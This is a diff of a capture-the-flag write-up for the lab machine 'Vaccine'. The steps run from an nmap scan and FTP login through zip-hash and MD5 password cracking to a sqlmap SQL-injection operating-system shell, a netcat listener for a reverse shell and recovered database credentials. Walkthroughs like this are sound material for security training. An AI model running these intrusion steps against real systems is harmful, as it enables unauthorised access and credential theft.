@@ -1,17 +1,17 @@
 # Vaccine
 
-## ifconfig
+## Ifconfig
 
 <pre>
 inet 10.10.14.69  netmask 255.255.254.0
 inet6 fe80::d484:44d2:fd97:c02c
 </pre>
 
-## nmap
+## Nmap
+
+> sudo nmap -sC -sV -A 10.10.10.46
 
 <pre>
-sudo nmap -sC -sV -A 10.10.10.46
-
 Nmap scan report for 10.10.10.46
 Host is up (0.24s latency).
 Not shown: 997 closed tcp ports (reset)
@@ -39,15 +39,18 @@ HOP RTT       ADDRESS
 2   244.90 ms 10.10.10.46
 </pre>
 
-## Need to install ftp
+## Install ftp
+
+> sudo apt install ftp
+
+> ftp 10.10.10.46
 
 <pre>
-ftp 10.10.10.46
 username: ftpuser
 password: mc@F1l3ZilL4
 </pre>
 
-and then get the backup.zip
+and then get the [backup.zip](./ftp/backup.zip)
 
 ## Use zip hash to crack
 
@@ -62,7 +65,7 @@ backup.zip:741852963::backup.zip:style.css, index.php:backup.zip
 
 - unzip with password 741852963
 
-> unzip backup.zip 
+> unzip [backup.zip](./ftp/backup.zip) 
 
 
 ## Try login on [index.php](./ftp/backup/index.php)
@@ -72,11 +75,11 @@ username: admin
 password (md5 reverse): 2cb42f8734ea607eefed3b70af13bbd3 ( qwerty789)
 </pre>
 
-## Sqlmap to hack os shell
+## Sqlmap hack to the os shell
 
-> sqlmap 10.10.10.46/dashboard.php?search=whatever --cookie="PHPSESSID=01aruoep6i9jf18e8ho8runboo" --os-shell
+> sqlmap 10.10.10.46/dashboard.php?search=whatever --cookie="PHPSESSID=**"what you get on session"**" --os-shell
 
-### Check self name
+- Check self name
 
 > whoami
 
@@ -84,7 +87,7 @@ password (md5 reverse): 2cb42f8734ea607eefed3b70af13bbd3 ( qwerty789)
 postgres
 </pre>
 
-### Check current path
+- Check current path
 
 > pwd
 
@@ -92,7 +95,7 @@ postgres
 /var/lib/postgresql/11/main
 </pre>
 
-### Remote command to local
+- Remote command to local
 
 *Source*
 
@@ -102,7 +105,7 @@ postgres
 
 > nc -lvnp *port*
 
-### Get ID
+- Get ID
 
 > id
 
@@ -110,13 +113,11 @@ postgres
 uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)
 </pre>
 
-### Find postgresql account in [/var/www/html/dashboard.php](./dashboard.php)
+- Find postgresql account in [/var/www/html/dashboard.php](./dashboard.php)
 
 <pre>
 username: postgres
 password: P@s5w0rd!
-port:     5432 (omit)
-dbname:   carsdb
 </pre>
 
 ## Sudo lists all privilege current user can do
